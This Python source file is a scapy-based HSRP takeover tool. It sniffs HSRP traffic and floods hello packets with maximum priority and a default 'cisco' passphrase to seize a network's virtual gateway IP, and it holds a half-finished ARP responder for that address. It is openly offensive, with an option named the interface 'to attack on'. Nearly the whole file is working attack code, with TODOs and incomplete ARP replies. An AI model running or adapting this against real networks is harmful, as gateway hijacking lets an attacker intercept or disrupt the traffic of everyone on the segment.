from scapy.all import *
from argparse import ArgumentParser
from multiprocessing import Process


"""
Constants for HSRP
"""
PORT = 1985
MULTICAST_IP = "224.0.0.2"
PRIORITY = 255
GROUP = 0
AUTH = "cisco"
VERSION = {"224.0.0.2": "1",
		   "224.0.0.102": "2"}
MULTICAST_MAC = "01:00:5e:00:00:{}"
VIRTUAL_IP = "192.168.1.1"
MD5_AUTH = 0 # TODO print out the bytes and the hash result; refer to hsrpmd5 packet format

"""
Constants for argument parser
"""
DESCRIPTION = """
Use the --sniff argument to display any sniffed packets.

Use the --takeover argument to takeover begin sending HSRP packets to takeover.
Optional arguments to supply are:
--iface <iface>
--group <group_id>
--ip <virtual_ip>
--auth <passphrase>
--md5_auth [False|True]

ARP requests for the virtual IP are responded to in conjunction with the takeover.
"""


parser = ArgumentParser(description=DESCRIPTION)
parser.add_argument("--sniff", help="Sniff HSRP packets for 10 seconds.", action="store_true")
parser.add_argument("--takeover", help="Begin the takeover.", action="store_true")
parser.add_argument("--iface", dest="iface", help="Interface to attack on. Default is eth0.", type=str)
parser.add_argument("--group", dest="grp", help="The group ID to takeover. Default is 0.", type=str)
parser.add_argument("--ip", dest="ip", help="The virtual IP to takeover. Default is 192.168.1.1", type=str)
parser.add_argument("--auth", dest="auth", help="The passphrase used for authentication. Default is cisco.", type=str)
parser.add_argument("--md5_auth", dest="md5_auth", help="Specifies whether to use md5 authentication.", type=bool)
args = parser.parse_args()


def main():
	"""
	Main function to run the takeover.
	"""
	iface = "eth0"

	if args.iface:
		iface = args.iface
	
	# Arguments not supplied
	if not (args.sniff or args.takeover):
		parser.print_help()
		exit(1)

	if args.sniff:
		print("[+] Starting sniff on interface {}...".format(iface))
		pkts = sniff(iface=iface, timeout=10, filter="udp src port 1985 and udp src port 1985", prn=print_hsrp)

		if not pkts:
			print("[-] No HSRP packets sniffed.")
			exit(1)

		print("[+] HSRP packets found.")
	
	if args.takeover:
		# HSRP flooding
		P1 = Process(target=hsrp_takeover, args=(iface, args.grp, args.ip, args.auth))
		P1.start()
		print("[+] HSRP takeover process started.")
		
		# Responding to ARP requests
		# respond_arp()
		# print([+] Responding to ARP requests...")


def respond_arp(virtual_ip):
	"""
	Starts the asynchronous sniffer that responds to ARP requests
	:param virtual_ip: the virtual ip to respond to
	:return: None
	"""
	print("[+] Initiating ARP responder...")
	
	responder = AsyncSniffer(store=False, filter="arp", prn=handle_arp)
	responder.start()


def handle_arp(pkt):
	"""
	Responds to ARP requests
	:param pkt: ARP packet captured by the sniffer
	:return: None
	"""
	arp_pkt = pkt[ARP]
	
	# filter ARP requests only and only those that are requesting the virtual IP that was taken over
	if arp_pkt.op == ARP.who_has and arp_pkt.pdst == VIRTUAL_IP:
		# TODO
		sendp(Ether(dst=pkt[Ether].src) / ARP(op=ARP.is_at))


def hsrp_takeover(iface, grp, ip, auth):
	"""
	Sends HSRP packets every 3 seconds.
	:param grp: group number
	:param ip: virtual ip
	:param auth: passphrase used for authentication
	:return:
	"""
	global GROUP
	global AUTH
	global VIRTUAL_IP

	print("[+] Initiating HSRP takeover...")

	if grp:
		GROUP = grp
	
	if ip:
		VIRTUAL_IP = ip
	
	if auth:
		AUTH = auth

	print("[+] Starting HSRP flooding...")
	
	# TODO confirm whether the src mac matters
	frame = Ether(dst=MULTICAST_MAC.format(GROUP))
	packet = IP(dst=MULTICAST_IP, ttl=1)
	segment = UDP(sport=PORT, dport=PORT)
	hsrp_layer = HSRP(group=int(GROUP), priority=PRIORITY, auth=AUTH, virtualIP=VIRTUAL_IP)

	sendp(frame/packet/segment/hsrp_layer, iface=iface, loop=1, inter=3)


def print_hsrp(pkt):
	return """
	{} \n
	HSRP version: {} \n
	Source IP: {}
	""".format(pkt[HSRP].show(), VERSION[pkt[IP].dst], pkt[IP].src)

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
	main()
